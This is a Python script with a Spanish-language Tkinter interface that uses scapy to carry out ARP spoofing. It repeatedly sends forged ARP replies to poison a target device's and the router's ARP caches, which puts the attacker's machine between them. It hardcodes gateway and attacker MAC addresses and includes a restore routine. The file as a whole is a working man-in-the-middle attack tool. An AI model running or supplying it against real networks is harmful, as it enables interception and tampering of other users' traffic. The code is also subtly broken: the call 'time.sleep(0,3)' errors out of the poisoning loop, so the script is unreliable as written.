import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, sendp, getmacbyip, conf
import time
import threading
import os
import platform
import ctypes  


INTERFAZ_RED = "Wi-Fi 2"  
IP_PUERTA_ENLACE = "192.168.0.1"
MAC_PUERTA_ENLACE = "b0:92:4a:b5:64:27"  
MAC_ATACANTE = "90:2e:16:ba:4c:35"       


conf.use_pcap = True
conf.verb = 0
conf.iface = INTERFAZ_RED  


ataque_en_curso = False

def verificar_privilegios():
    try:
        if platform.system() == 'Windows':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0  
    except Exception as e:
        messagebox.showerror("Error", f"No se pudo verificar privilegios: {str(e)}")
        return False

def obtener_mac(ip):
    """Versión mejorada con getmacbyip y manejo de errores detallado."""
    try:
        mac = getmacbyip(ip)
        if mac:
            return mac.lower()  
        print(f"[!] No se pudo obtener MAC para {ip} (¿Firewall/ARP cache?)")
        return None
    except Exception as e:
        print(f"[!] Error crítico al obtener MAC de {ip}: {str(e)}")
        return None

def spoofing_arp(ip_objetivo, widget_salida):
    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    
    if not mac_objetivo:
        widget_salida.insert(tk.END, "❌ No se pudo obtener MAC del objetivo\n")
        return

    widget_salida.insert(tk.END, f"✅ Objetivo: {ip_objetivo} [MAC: {mac_objetivo}]\n")
    widget_salida.insert(tk.END, f"✅ Router: {IP_PUERTA_ENLACE} [MAC: {MAC_PUERTA_ENLACE}]\n")

    try:
        while ataque_en_curso:
          
            sendp(
                Ether(src=MAC_ATACANTE, dst=mac_objetivo) /
                ARP(op=2, hwsrc=MAC_ATACANTE, psrc=IP_PUERTA_ENLACE, 
                    hwdst=mac_objetivo, pdst=ip_objetivo),
                verbose=0
            )
            
            
            sendp(
                Ether(src=MAC_ATACANTE, dst=MAC_PUERTA_ENLACE) /
                ARP(op=2, hwsrc=MAC_ATACANTE, psrc=ip_objetivo,
                    hwdst=MAC_PUERTA_ENLACE, pdst=IP_PUERTA_ENLACE),
                verbose=0
            )
            
            widget_salida.insert(tk.END, f"[+] Envenenando ARP: {ip_objetivo} <-> Router\n")
            time.sleep(0,3)
    except Exception as e:
        widget_salida.insert(tk.END, f"[!] Error en spoofing: {str(e)}\n")

def restaurar_arp(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    if mac_objetivo and MAC_PUERTA_ENLACE:
        
        sendp(
            Ether(dst=mac_objetivo) /
            ARP(op=2, hwsrc=MAC_PUERTA_ENLACE, psrc=IP_PUERTA_ENLACE,
                hwdst=mac_objetivo, pdst=ip_objetivo),
            count=5, verbose=0
        )
        # Restaura ARP del router
        sendp(
            Ether(dst=MAC_PUERTA_ENLACE) /
            ARP(op=2, hwsrc=mac_objetivo, psrc=ip_objetivo,
                hwdst=MAC_PUERTA_ENLACE, pdst=IP_PUERTA_ENLACE),
            count=5, verbose=0
        )

def iniciar_spoofing():
    global ataque_en_curso
    if not verificar_privilegios():
        return
        
    ip_objetivo = entrada_ip.get().strip()
    if not ip_objetivo:
        messagebox.showerror("Error", "Ingresa una IP objetivo")
        return
        
    widget_salida.delete(1.0, tk.END)
    ataque_en_curso = True
    threading.Thread(
        target=spoofing_arp, 
        args=(ip_objetivo, widget_salida),
        daemon=True
    ).start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False
    ip_objetivo = entrada_ip.get().strip()
    if ip_objetivo:
        restaurar_arp(ip_objetivo)
    widget_salida.insert(tk.END, "\n[✓] Ataque detenido. Tabla ARP restaurada\n")


ventana = tk.Tk()
ventana.title("ARP Spoofer Avanzado - VirtualBox/Wi-Fi")

tk.Label(ventana, text="IP Objetivo:").pack(pady=5)
entrada_ip = tk.Entry(ventana, width=30)
entrada_ip.pack(pady=5)
entrada_ip.insert(0, "192.168.0.16") 

frame_botones = tk.Frame(ventana)
frame_botones.pack(pady=10)

boton_iniciar = tk.Button(
    frame_botones, 
    text="Iniciar Spoofing", 
    command=iniciar_spoofing, 
    bg='#4CAF50', fg='white'
)
boton_iniciar.pack(side=tk.LEFT, padx=5)

boton_detener = tk.Button(
    frame_botones, 
    text="Detener Spoofing", 
    command=detener_spoofing, 
    bg='#F44336', fg='white'
)
boton_detener.pack(side=tk.LEFT, padx=5)

widget_salida = scrolledtext.ScrolledText(ventana, width=70, height=20, wrap=tk.WORD)
widget_salida.pack(pady=10)


ventana.mainloop()